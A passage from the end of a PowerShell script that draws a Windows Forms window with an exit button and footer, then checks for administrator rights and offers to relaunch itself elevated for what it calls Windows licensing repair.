        $btnExit.Location = New-Object System.Drawing.Point(445, 215)
        $btnExit.BackColor = [System.Drawing.Color]::FromArgb(80, 40, 40)
        $btnExit.ForeColor = [System.Drawing.Color]::White
        $btnExit.FlatStyle = "Flat"
        $btnExit.Cursor = [System.Windows.Forms.Cursors]::Hand
        $btnExit.Add_MouseEnter({ $this.BackColor = [System.Drawing.Color]::FromArgb(110, 55, 55) })
        $btnExit.Add_MouseLeave({ $this.BackColor = [System.Drawing.Color]::FromArgb(80, 40, 40) })
        $btnExit.Add_Click({ $form.Close() })
        $form.Controls.Add($btnExit)

        $footer = New-Object System.Windows.Forms.Label
        $footer.Text = $script:Copyright
        $footer.Font = New-Object System.Drawing.Font("Segoe UI", 8)
        $footer.ForeColor = [System.Drawing.Color]::FromArgb(120, 140, 180)
        $footer.Location = New-Object System.Drawing.Point(0, 370)
        $footer.Size = New-Object System.Drawing.Size(560, 20)
        $footer.TextAlign = "MiddleCenter"
        $form.Controls.Add($footer)

        $form.ShowDialog()
    } catch {
        Show-ConsoleFallback
    }
}

# ============================================================
# ENTRY POINT
# ============================================================
try {
    if (-not (Test-Admin)) {
        try {
            $result = [System.Windows.Forms.MessageBox]::Show(
                "Administrator privileges are required for Windows licensing repair.`n`nRelaunch as Administrator?",
                "Elevation Required",
                "YesNo",
                "Warning"
            )
            if ($result -eq "Yes") {
                $scriptPath = if ($MyInvocation.MyCommand.Path) { $MyInvocation.MyCommand.Path } else { $MyInvocation.InvocationName }
                Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
            }
        } catch {
            Write-Host "[ERROR] Administrator privileges required!" -ForegroundColor Red
            Read-Host "Press Enter to exit"
        }
        exit
    }

    Show-MainGUI
} catch {
    Show-ConsoleFallback
}